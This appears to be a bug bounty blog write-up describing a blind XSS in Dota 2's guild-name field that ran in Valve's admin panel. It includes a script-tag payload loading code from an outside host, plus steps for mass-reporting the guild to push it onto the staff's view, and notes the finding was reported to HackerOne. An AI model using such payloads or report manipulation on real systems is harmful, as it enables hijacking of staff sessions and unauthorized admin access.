---
comments: true
title: Gaining Access to Dota 2 Administration Panel By Exploiting In-Game Feature
date: 2022-03-31 00:00:00 +0700
category:
- bugbounty
tags:
- xss
- web
- dota2
private: false

---
The finding started when Dota 2 is announcing the new feature for the battle pass owner that is being able to create a guild in the game the update was around october 2020.

![Dota 2 Update ](/uploads/screen-shot-2022-03-31-at-14-03-20.png "Dota 2 Update ")

> **Guild Updates**
>
> We reintroduced Guilds during the Battle Pass, and we were happy to see how many players participated in Guilds and shared their feedback with us. We are keeping the existing Guilds, but many of the rewards received only worked in the context of the Battle Pass. We've redesigned those features so that you can enjoy playing with your guild all the time.
>
> \- source: [https://www.dota2.com/newsentry/3066366095799664170](https://www.dota2.com/newsentry/3066366095799664170 "https://www.dota2.com/newsentry/3066366095799664170")

Because i was an active player of the game and also bugbounty hunter, my idea just popped out to create guild with the Blind XSS Payload name, without even thingking the payload will executed somewhere on the valve systems.

![](/uploads/create-new-guild-1.png)

my first thought is wrong and the exploit was executed on the Dota 2 administration panel, which is a web application hosted on dota2.com which make me excited 🙀🙀🙀.

![](/uploads/174_total_reports.png)

This is was the admin panel looks like, rather than trying to escalating my privilege with the javascript execution i have, i just report what i found immediatelly to the [https://hackerone.com/valve](https://hackerone.com/valve "H1 Valve") team, but i've seen the admin panel is manage all the information of the game like the ip address of the currently in-game rooms, also i can possibly banned a player there, pro player information also stored there, etc is like almost everything custom game and whatever there.

![](/uploads/menus.png)

After my investigation to the vulnerability my conclusion is, the more guild registered to the system is more hard of our exploit being viewed by the staff that logged-in to the administrator panel because the table list of guild was sorted by the amount of report received to the guild, so to reproduce it for the second time i was using this steps below:

* Create guild with a blind xss payload as the name `'"><script src=//domain></script>`
* Report the guild name multiple times, until you feel the report amount is enough to make our guild listed on the first page.
* Profit! `alert(1)`

![](/uploads/reporting-1.png)

There is 3 form of report that can a guild get, `report guild name`, `report guild logo`, `report guild tag` and all of the report amount is combined to `total_reports` that will used as the sorted value when the `datatable` is loaded on the application.

I was automating this process to login to the game and report my guild repeatedly to get the amount of `total_reports` i want to get my guild on the first page of the `datatable` since the table is configured to only show 50 rows for each page, to get this was not hard since i was testing when the feature is just released couple days ago.

### Key Takeaways

* Keep in mind of your input might end up anywhere that you not even expect, we never know ¯\\_(ツ)_/¯ .

That is all for this writeup folks, see you on the next writeup :salute: .

***

Jun 12 2020: Reported  
Jun 12 2020: Severity Changed Crit -> High ( I don't get it actually,  the team said my xss need user interaction but i don't think that make a)  
Jun 16 2020: Triaged  
Sept 8 2020: Severity Changed High -> Med ( Based on all the information and actions that i can do there, this just dissapointing 😪 )  
Sept 8 2020: Rewarded 750USD + 150USD Bonus

Proof(UNDISCLOSED yet): [https://hackerone.com/reports/896281](https://hackerone.com/reports/896281 "https://hackerone.com/reports/896281")